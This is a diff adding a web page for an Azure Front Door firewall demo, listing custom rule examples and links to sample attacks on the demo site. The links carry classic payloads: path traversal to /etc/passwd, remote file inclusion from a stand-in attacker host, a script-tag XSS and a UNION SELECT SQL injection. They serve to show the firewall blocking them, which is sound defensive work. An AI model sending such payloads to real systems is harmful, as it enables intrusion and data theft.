@@ -1,0 +1,53 @@
+﻿@{
+    ViewData["Title"] = "Azure Front Door";
+}
+<div>
+    <table class="mr-auto p-2 bd-highlight">
+        <thead class="font-front">
+            <tr>
+
+                <th class="mr-auto p-2 bd-highlight">
+                    <h1 style="color: mediumblue;">@ViewData["Title"]</h1>
+
+                </th>
+
+                <th class="mr-auto p-2 bd-highlight">
+                    <img src="~/images/azure-front-door-lab_thumb.png" align="left" width="140" height="90">
+                    
+                </th>
+                
+            </tr>
+        </thead>
+    </table>
+
+</div>
+
+
+<h4>
+    Azure Front Door Web Application Firewall Demo.
+</h4>
+
+<h5 style="color:red;">WAF Policy Rules </h5>
+<p>Custom Rules Examples</p>
+
+<p>Priority </p>
+<ol>
+    <li>Always allow from Company IP ranges</li>
+    <li>Block US traffic to Guide page</li>
+    <li>Rate limit Web Form page</li>
+    <li>Redirect to FrontDoor site when query String contains frontdoor</li>
+    <li>Bot traffic - block if user agent contains suspcious</li>
+</ol>
+
+<h4 style="color:red">Attack Vector Managed Rule Set Examples</h4>
+<ul>
+    <li>   <a href="https://tdlwafdemo.azurefd.net/?file=../../../../etc/passwd">LFI</a>  Local File Inclusion (Traversal) </li>
+    <li>   <a href="https://tdlwafdemo.azurefd.net/?file=http://attacker.example.com/evil.php">RFI</a>  Remote  File Inclusion </li>
+    <li>   <a href="https://tdlwafdemo.azurefd.net/Home/?id=<script>alert('you have been hacked');</script>">XSS</a> Cross-site Scripting </li>
+    <li>   <a href="https://tdlwafdemo.azurefd.net/uploadedfile.txt">Restricted File</a> </li>
+    <li>   <a href="https://tdlwafdemo.azurefd.net/Home/List/?cid=1%20UNION%20SELECT%20NULL%20FROMINFORMATION_SCHEMA.TABLES--">SQL Injection</a></li>
+</ul>
+<Div class="d-flex justify-content-center bd-highlight">
+    <img src="~/images/thomas_duryea_logicalis_logo.png" align="left" width="350" height="90">
+</Div>
+
